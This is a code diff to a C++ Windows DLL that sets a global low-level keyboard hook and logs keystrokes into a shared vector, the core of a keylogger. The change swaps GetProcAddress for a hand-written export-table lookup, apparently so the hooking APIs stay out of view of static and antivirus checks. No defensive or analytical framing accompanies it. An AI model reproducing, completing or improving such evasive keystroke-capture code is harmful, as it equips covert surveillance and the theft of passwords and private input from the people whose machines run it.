@@ -16,15 +16,13 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
 void* FindExportAddress(HMODULE hModule, const char* funcName);
 ///////////////////////////////////////////////////////////////////////
 
-HMODULE hUser32 = (HMODULE)GetModuleHandleA("user32.dll");
+typedef HHOOK(WINAPI *SetWinHookFn)(int, HOOKPROC, HINSTANCE, DWORD);
+typedef BOOL(WINAPI *UnhookWinHookExFn)(HHOOK);
+typedef LRESULT(WINAPI *CallNxtHookExFn)(HHOOK, int, WPARAM, LPARAM);
 
-typedef HHOOK(WINAPI *SetWindowsHookExFn)(int, HOOKPROC, HINSTANCE, DWORD);
-typedef BOOL(WINAPI *UnhookWindowsHookExFn)(HHOOK);
-typedef LRESULT(WINAPI *CallNextHookExFn)(HHOOK, int, WPARAM, LPARAM);
-
-SetWindowsHookExFn MySetWindowsHookEx = (SetWindowsHookExFn)GetProcAddress(hUser32, "SetWindowsHookExA");
-UnhookWindowsHookExFn MyUnhookWindowsHookEx = (UnhookWindowsHookExFn)GetProcAddress(hUser32, "UnhookWindowsHookEx");
-CallNextHookExFn MyCallNextHookEx = (CallNextHookExFn)GetProcAddress(hUser32, "CallNextHookEx");
+SetWinHookFn MySetWindowsHookEx;
+UnhookWinHookExFn MyUnhookWindowsHookEx;
+CallNxtHookExFn MyCallNextHookEx;
 
 ///////////////////////////////////////////////////////////////////////
 
@@ -54,8 +52,12 @@ void* FindExportAddress(HMODULE hModule, const char* funcName)
 
 DLL_EXPORT void Initialize(std::vector<std::string>* logVector)
 {
-    sharedLogVector = logVector;  
+    HMODULE hUser32 = (HMODULE)GetModuleHandleA("user32.dll");
+    MySetWindowsHookEx = (SetWinHookFn)FindExportAddress(hUser32, "SetWindowsHookExA");
+    MyUnhookWindowsHookEx = (UnhookWinHookExFn)FindExportAddress(hUser32, "UnhookWindowsHookEx");
+    MyCallNextHookEx = (CallNxtHookExFn)FindExportAddress(hUser32, "CallNextHookEx");
 
+    sharedLogVector = logVector;  
     k_Hook = MySetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
 }
 
